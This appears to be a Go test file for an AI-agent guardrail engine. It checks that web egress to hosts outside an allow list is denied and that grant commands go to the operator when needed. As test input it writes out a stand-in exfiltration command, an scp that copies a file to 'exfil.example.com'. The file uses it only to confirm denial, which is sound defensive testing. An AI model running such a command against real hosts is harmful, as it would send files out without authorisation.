package engine

import (
	"strings"
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

// #125: an agent denied a web host must be handed the exact grant, not a
// placeholder it has to adapt. The command is built in one place and must be
// the canonical spelling the broker path recognises, or running it would be
// P5-denied instead of filing a request.
func TestWebHostGrantCommandIsCanonical(t *testing.T) {
	for _, hosts := range [][]string{{"starship.rs"}, {"api.example.com", "cdn.example.com"}} {
		command := policy.WebHostGrantCommand(hosts...)
		action, ok := OperatorAction(ToolCall{Tool: "Bash", Command: command})
		if !ok || action.Name != "web-host-grant" || action.Parameters["scope"] != "repo" || action.Parameters["hosts"] != strings.Join(hosts, ",") {
			t.Errorf("%q is not recognised as the canonical grant: %+v %v", command, action, ok)
		}
	}
}

// #616 §2: on a host whose permission mode answers asks itself, running the
// recommended grant denies (#559/ADR-0035), so the P6 deny must not point the
// agent at running it — the operator is the addressee there. The default
// posture keeps #125's run-it grant unchanged.
func TestHostAutoEgressDenyHandsTheGrantToTheOperator(t *testing.T) {
	pol := netPol("api.github.com")
	base := ToolCall{Tool: "Bash", Command: "curl https://a.rs/presets/", CWD: "/repo", RepoRoot: "/repo"}
	grant := policy.WebHostGrantCommand("a.rs")

	claude := base
	claude.Plane, claude.HostAutoApproves = "claude", true
	v := Evaluate(claude, pol)
	if v.RuleID != "P6.egress" || v.Decision != policy.Deny {
		t.Fatalf("auto claude: %+v", v)
	}
	if strings.Contains(v.Reason, "; grant: ") {
		t.Errorf("auto reason still tells the agent to run the grant: %q", v.Reason)
	}
	for _, want := range []string{"operator", "`! " + grant + "`"} {
		if !strings.Contains(v.Reason, want) {
			t.Errorf("auto claude reason lacks %q: %q", want, v.Reason)
		}
	}

	opencode := base
	opencode.Plane, opencode.HostAutoApproves = "opencode", true
	v = Evaluate(opencode, pol)
	if strings.Contains(v.Reason, "; grant: ") || strings.Contains(v.Reason, "`! ") {
		t.Errorf("auto opencode reason must not offer the `!` form or the run-it grant: %q", v.Reason)
	}
	for _, want := range []string{"operator", "terminal", grant} {
		if !strings.Contains(v.Reason, want) {
			t.Errorf("auto opencode reason lacks %q: %q", want, v.Reason)
		}
	}

	plain := base
	plain.Plane = "claude"
	v = Evaluate(plain, pol)
	if !strings.Contains(v.Reason, "; grant: "+grant) {
		t.Errorf("default posture must keep #125's run-it grant: %q", v.Reason)
	}
}

func TestWebEgressDenyReasonNamesTheExactGrant(t *testing.T) {
	pol := netPol("api.github.com")
	for _, command := range []string{
		"curl https://starship.rs/presets/",
		"wget https://starship.rs/presets/",
		"Invoke-WebRequest https://starship.rs/presets/",
	} {
		v := evalNet(t, command, pol)
		if v == nil || v.RuleID != "P6.egress" {
			t.Fatalf("%q -> %+v, want P6.egress", command, v)
		}
		if want := policy.WebHostGrantCommand("starship.rs"); !strings.Contains(v.Reason, want) {
			t.Errorf("%q reason %q does not name %q", command, v.Reason, want)
		}
	}
	// Not a web page: a web-host grant would not help, so none is offered.
	for _, command := range []string{"scp f.txt user@exfil.example.com:/tmp", "ssh exfil.example.com"} {
		v := evalNet(t, command, pol)
		if v == nil || v.RuleID != "P6.egress" {
			t.Fatalf("%q -> %+v, want P6.egress", command, v)
		}
		if strings.Contains(v.Reason, "egress grant") {
			t.Errorf("%q reason %q offers a web-host grant for a non-web tool", command, v.Reason)
		}
	}
}
